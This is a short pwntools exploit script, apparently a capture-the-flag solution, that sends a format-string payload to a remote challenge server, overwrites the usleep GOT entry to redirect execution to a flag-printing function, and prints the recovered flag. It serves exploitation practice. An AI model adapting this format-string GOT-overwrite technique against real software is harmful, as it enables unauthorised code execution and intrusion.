from pwn import *
conn = remote('140.113.207.245', 30175)

context.binary = binary = ELF("simple_rtos/simple_rtos", checksec=False)
got_usleep_addr = binary.got.usleep

'''
4694(0x1256, putFlag's address)=64(0x40)+4630
'''

payload = b"%64X%15$n" + b"%4630X%16$hnAAA" + p64(got_usleep_addr + 2) + p64(got_usleep_addr)
conn.recvuntil(b'Enter your command: \n> ')
conn.send(payload)
conn.recvuntil(b'CSC2025')
flag = conn.recvuntil(b'}').decode('ascii')
print(f'CSC2025{flag}')
